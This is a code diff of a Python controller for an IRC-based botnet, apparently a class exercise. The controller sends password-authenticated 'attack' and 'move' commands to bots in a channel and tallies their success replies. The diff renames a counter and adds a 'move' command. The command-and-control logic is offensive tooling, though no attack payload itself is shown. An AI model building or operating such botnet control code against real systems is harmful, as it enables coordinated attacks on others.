@@ -10,16 +10,17 @@ PORT = 0000
 CHAN = ''
 PASS = ''
 BOTS = []
-ATTACK_COUNTER = 0
+COUNTER = 0
 
-# same as other methods =3=
-def attack(sender, overflow):
+
+# attack or move
+def command_bot(sender, overflow, message):
     if sender in BOTS:
-        global ATTACK_COUNTER
+        global COUNTER
 
         if('success' in overflow):
-            print(sender + " attacked")
-            ATTACK_COUNTER = ATTACK_COUNTER + 1
+            print(sender + " " +  message)
+            COUNTER = COUNTER + 1
         elif('failed' in overflow):
             print(sender + " failed")
 
@@ -28,9 +29,9 @@ def attack(sender, overflow):
 
         sender = prefix.split("!")[0]
         if(len(args) == 1):
-            attack(sender, args[0])
+            command_bot(sender, args[0], message)
         else:
-            attack(sender, args[1])
+            command_bot(sender, args[1], message)
     return
 
 '''
@@ -154,7 +155,10 @@ def recv():
                     shutdown(sender, args[1])
 
                 if "attack" in args[1]:
-                    attack(sender, args[1])
+                    command_bot(sender, args[1], 'attack')
+                
+                if "move" in args[1]:
+                    command_bot(sender, args[1], 'moved')
                     
 
                 
@@ -162,6 +166,7 @@ def recv():
 
 def send():
     global QUIT
+    global COUNTER
     # authenticate self to existing bots in channel
     s.send(privmsg(CHAN, PASS).encode('utf-8'))
     
@@ -188,9 +193,13 @@ def send():
         elif "attack" in msg:
             s.send(privmsg(CHAN, msg).encode('utf-8'))
             time.sleep(5)
-            global ATTACK_COUNTER
-            print("Total: %d successful, %d unsuccessful"%(ATTACK_COUNTER, (len(BOTS)-ATTACK_COUNTER)))
-            ATTACK_COUNTER = 0
+            print("Total: %d successful, %d unsuccessful"%(COUNTER, (len(BOTS)-COUNTER)))
+            COUNTER = 0
+        elif "move" in msg:
+            s.send(privmsg(CHAN, msg).encode('utf-8'))
+            time.sleep(5)
+            print("Total: %d successful, %d unsuccessful"%(COUNTER, (len(BOTS)-COUNTER)))
+            COUNTER = 0
         else:
             s.send(privmsg(CHAN, msg).encode('utf-8'))
 
@@ -205,8 +214,12 @@ if __name__ == "__main__":
         PASS = sys.argv[4]
         NICK = "controller_"+generate_nickname(5)
 
+        
+
         try:
             s = socket.socket()
+
+            print("here")
             s.connect((HOST, PORT))
             s.send("PASS {}\r\n".format(PASS).encode("utf-8"))
             s.send("NICK {}\r\n".format(NICK).encode("utf-8"))
@@ -231,6 +244,7 @@ if __name__ == "__main__":
             status_thread.join()
             recv_thread.join()
             send_thread.join()
+            s.close()
             sys.exit(1)
     
     else:
